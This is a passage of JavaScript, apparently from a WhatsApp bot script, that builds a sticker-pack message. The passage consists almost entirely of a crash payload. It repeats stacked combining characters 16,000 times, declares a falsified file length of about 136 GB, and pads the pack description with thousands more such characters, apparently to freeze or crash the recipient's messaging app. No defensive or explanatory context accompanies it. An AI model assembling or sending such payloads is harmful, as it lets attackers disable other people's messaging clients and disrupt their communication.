꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟".repeat(16000),
          stickers: [
            {
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🩸"],
              accessibilityLabel: "",
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
              isAnimated: false,
              emojis: ["☠️"],
              accessibilityLabel: "",
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
              isAnimated: false,
              emojis: ["🌸"],
              accessibilityLabel: "",
              isLottie: false,
              mimetype: "image/webp"
            }
          ],
          fileLength: "136870912000",
          fileSha256: Buffer.from("G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=", "base64"),
          fileEncSha256: Buffer.from("2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=", "base64"),
          mediaKey: Buffer.from("rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=", "base64"),

          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
          packDescription: "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ 